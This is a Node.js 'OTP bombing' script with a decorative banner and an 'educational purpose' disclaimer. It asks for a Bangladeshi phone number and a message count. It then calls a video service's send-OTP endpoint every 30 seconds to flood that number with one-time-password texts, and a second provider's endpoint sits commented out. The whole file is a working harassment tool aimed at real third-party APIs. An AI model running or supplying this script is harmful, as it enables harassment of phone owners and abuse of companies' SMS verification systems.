/*
[*] Author: Fazle Rabbi
[*] Date: 7 November,2022
[*] Hey geek, You don't become a coder by changing credits.
[*] WARNING: This script is only for educational purpose, If you do any crime using this script then i will not responsible. Keep in mind!
*/
const prompt = require('prompt-sync')();
const axios = require('axios');
const url = 'https://api.bongo-solutions.com/auth/api/login/send-otp'
// const number = '';

const colors = {
   red: '\033[91m',
   green: '\033[92m',
   yellow: '\033[93m',
   blue: '\033[94m',
   pink: '\033[95m',
   cyan: '\033[96m',
   reset: '\033[0m'
};
const {red,green,yellow,blue,pink,cyan,reset} = colors;

// Banner:
function Banner(){
   console.log(`
   ${pink}
   ██╗░░░░░░█████╗░███████╗██╗░░░██╗
   ██║░░░░░██╔══██╗╚════██║╚██╗░██╔╝
   ██║░░░░░███████║░░███╔═╝░╚████╔╝░
   ██║░░░░░██╔══██║██╔══╝░░░░╚██╔╝░░
   ███████╗██║░░██║███████╗░░░██║░░░
   ╚══════╝╚═╝░░╚═╝╚══════╝░░░╚═╝░░░   
   ${red}
    ▒█▀▀█ █▀▀█ █▀▄▀█ █▀▀▄ █▀▀ █▀▀█ 
    ▒█▀▀▄ █░░█ █░▀░█ █▀▀▄ █▀▀ █▄▄▀ 
    ▒█▄▄█ ▀▀▀▀ ▀░░░▀ ▀▀▀░ ▀▀▀ ▀░▀▀   
   `);
   Info()
}

function Info(){
   console.log(`${reset}
╻──────────────────────────────────────────────╻   
│     ${green} v 1.0.1                                 │
│     ${green} Author: ${yellow}Fazle Rabbi                     │
│     ${green} Github: ${yellow}https://github.com/fh-rabbi${reset}     │
╹──────────────────────────────────────────────╹   
   
   ${red}⚡ NOTE: ${reset}Every otp will be send with 30 second delay!
   
   `);
}

Banner()
const startBombing = prompt('[*] Do you want to start bombing? type y/n:')
if(startBombing == 'y'){
   const number = prompt('[*] Type a phone number wuthout country code:')
   const amount = prompt('[*] How many otp you want to send:')
   
   function sendOtp(){
      console.log('\033[32m[*] Sending otp...');
      
      // axios.post(url,{
      //    operator: "all",
      //    msisdn:"+880"+number     
      // })
      // .then(res=>{
      //    // console.log(res);
      //    // console.log(res.data);
      //    console.log('\033[33m [*] Api1--> Sent otp success.');
      //    console.log('-------------------');
      // })
      // .catch(err=>{
      //    console.log('[*] Api1--> Something went wrong!');
      // });
      
      
      axios(`https://stage.bioscopelive.com/en/login/send-otp?phone=88${number}&operator=bd-otp`)
      .then(res=>{
         console.log('\033[33m[*] Sent otp success to --> '+pink+number);
      })
      .catch(err=>{
         console.log('\033[1;91m[*] '+err);
         console.log('[*] Api2--> Something went wrong!');
      });
   }
   
   if(number.length < 11 || number.length > 11 ){
      console.log(red+'[*] Invalid Number!');
   }else{
   sendOtp();
   let count = 0;
   let clear = setInterval(function() {
      sendOtp();
      // console.log('');
      count++;
      demo(count,clear);
   }, 30000);   
   }
   function demo(count,clear){
         if(count==Number(amount)){
            clearInterval(clear);
         }else{
            // console.log('');
         }   
      }
   
}else{
   console.log('');
   console.log(red+'   ☢️ Quiting...');
   console.log('');
}